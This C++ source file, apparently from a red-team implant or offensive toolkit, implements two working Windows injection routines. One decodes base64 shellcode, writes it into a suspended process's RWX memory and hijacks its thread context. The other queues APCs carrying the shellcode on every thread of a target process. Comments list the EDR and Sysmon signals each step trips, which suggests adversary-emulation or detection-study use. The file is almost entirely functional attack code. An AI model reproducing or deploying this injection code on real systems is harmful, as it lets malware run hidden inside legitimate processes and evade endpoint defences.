#include "Hollow.h"
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment(lib, "Crypt32.lib")

// Decode base64 shellcode into a byte vector.
static std::vector<BYTE> B64Decode(const std::string& b64) {
    DWORD len = 0;
    CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                         CRYPT_STRING_BASE64_ANY, nullptr, &len, nullptr, nullptr);
    if (!len) return {};
    std::vector<BYTE> out(len);
    CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
                         CRYPT_STRING_BASE64_ANY, out.data(), &len, nullptr, nullptr);
    out.resize(len);
    return out;
}

// ── Process hollowing via thread-context hijack ───────────────────────────────

std::string Hollow::HollowProcess(const std::string& target,
                                   const std::string& shellcodeB64) {
    std::vector<BYTE> sc = B64Decode(shellcodeB64);
    if (sc.empty()) return "hollow: base64 decode failed or empty shellcode";

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);

    // Detection: CreateProcess with CREATE_SUSPENDED flag from a non-parent binary
    // is a primary signal for process-hollowing / process-doppelganging detection.
    if (!CreateProcessA(NULL, const_cast<char*>(target.c_str()),
                        NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return "hollow: CreateProcess failed err=" + std::to_string(GetLastError()) +
               " target=" + target;
    }

    // Allocate RWX memory in the target process.
    // Detection: VirtualAllocEx(PAGE_EXECUTE_READWRITE) in a freshly-created process
    // is logged by behaviour hooks — EDR tools watch this sequence closely.
    LPVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, sc.size(),
                                     MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "hollow: VirtualAllocEx failed err=" + std::to_string(GetLastError());
    }

    SIZE_T written = 0;
    // Detection: WriteProcessMemory into executable memory of a suspended process.
    if (!WriteProcessMemory(pi.hProcess, pRemote, sc.data(), sc.size(), &written)) {
        VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "hollow: WriteProcessMemory failed err=" + std::to_string(GetLastError());
    }

    // Redirect the thread's instruction pointer to the shellcode.
    // Detection: SetThreadContext modifying RIP to non-module memory = high-confidence
    // process-injection detection signal.
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "hollow: GetThreadContext failed";
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)pRemote;
#else
    ctx.Eip = (DWORD)pRemote;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "hollow: SetThreadContext failed err=" + std::to_string(GetLastError());
    }

    // Detection: ResumeThread after context manipulation — thread executes with
    // RIP in non-image, non-module memory. Behaviour-based EDRs catch this.
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return "hollow: injected " + std::to_string(sc.size()) + " bytes into " + target +
           " (PID=" + std::to_string(pi.dwProcessId) + ")";
}

// ── APC injection into existing process ──────────────────────────────────────

std::string Hollow::ApcInject(DWORD pid, const std::string& shellcodeB64) {
    std::vector<BYTE> sc = B64Decode(shellcodeB64);
    if (sc.empty()) return "apc: base64 decode failed or empty shellcode";

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        return "apc: OpenProcess(" + std::to_string(pid) + ") failed err=" +
               std::to_string(GetLastError());
    }

    LPVOID pRemote = VirtualAllocEx(hProc, NULL, sc.size(),
                                     MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        CloseHandle(hProc);
        return "apc: VirtualAllocEx failed";
    }

    SIZE_T written = 0;
    WriteProcessMemory(hProc, pRemote, sc.data(), sc.size(), &written);

    // Enumerate threads of the target process and queue an APC on each one.
    // APC executes when the thread enters an alertable wait (SleepEx, WaitForSingleObjectEx...).
    // Detection: QueueUserAPC from a foreign process = MITRE T1055.004, flagged by
    // Sysmon EventID 8 (CreateRemoteThread / APC injection) and most EDR sensors.
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    int queued = 0;
    if (hSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        if (Thread32First(hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) {
                    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                    if (hThread) {
                        if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0))
                            ++queued;
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnap, &te));
        }
        CloseHandle(hSnap);
    }

    CloseHandle(hProc);

    if (!queued) {
        return "apc: shellcode written but no threads were queue-able in PID=" +
               std::to_string(pid) + " (threads may not be alertable)";
    }

    return "apc: queued APC on " + std::to_string(queued) + " thread(s) in PID=" +
           std::to_string(pid) + " (" + std::to_string(sc.size()) + " bytes)";
}
